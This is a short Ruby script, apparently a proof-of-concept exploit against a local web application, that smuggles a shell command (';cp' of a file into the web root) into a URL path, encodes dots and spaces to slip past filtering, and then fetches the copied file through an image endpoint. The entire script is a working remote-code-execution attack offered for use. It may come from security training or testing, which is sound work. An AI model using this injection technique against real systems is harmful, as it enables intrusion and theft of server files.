require "cgi"

puts "copy file contents to web root via RCE:"
puts "-----------------------"
shell_line=";cp /home/app/file.txt /home/app/app/current/cats"

DOT = "%%%x" % ".".each_byte.first

shell_line = CGI.escape(shell_line).gsub(".", DOT).gsub("+", "%20")

`curl -4 -i --silent "http://localhost:3000/cats/#{shell_line}"`

system(%Q|curl -4 --silent "http://localhost:3000/cats/image?cat=file.txt"|)
puts "-----------------------"

